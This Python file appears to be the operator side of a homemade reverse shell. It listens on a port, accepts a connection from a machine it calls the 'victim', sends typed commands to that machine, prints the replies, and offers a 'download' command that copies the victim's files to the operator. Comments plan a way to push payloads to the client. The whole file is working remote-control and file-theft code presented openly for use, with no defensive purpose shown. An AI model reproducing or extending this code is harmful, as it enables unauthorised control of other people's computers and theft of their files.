import socket


# declare host ip and port 
SHOST = "192.168.2.153"
SPORT = 7123

# Create socket and start listening
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SHOST, SPORT))
s.listen()
print("port ", SPORT, " is open")
print("Waiting for connection ")
victim, addr = s.accept()


while True: 
    
    input_h = victim.recv(1024) # maybe should go for more bytes -> sends files in bigger chunks
    cmd = input(input_h.decode()).encode()

    # Created a function to download files of the victims pc
    if cmd.decode("utf-8").split(" ")[0] == "download":
        filename = cmd.decode("utf-8").split(" ")[1]
        victim.sendall(cmd)
        with open(filename, "wb") as fs:
            data = victim.recv(1024) # same here (L20)
            while data:
                fs.write(data)
                data = victim.recv(1024) # and here too 
                if data == b"check":
                    print("ok")
                # need to adjust this. also when a file is not found some shit happens
                    

    ###
    # make a send cmd. Server can send client payloads.
    ###

    if cmd == b"":
        print("no command entered")
    else: 
        victim.sendall(cmd)
        data = victim.recv(1024).decode("utf-8")
        if data == "bye":
            print("Following connection will be aborted: ", addr[0])
            break
        print(data) # might wanna comment this, due to a high load on terminal 

victim.close()
s.close()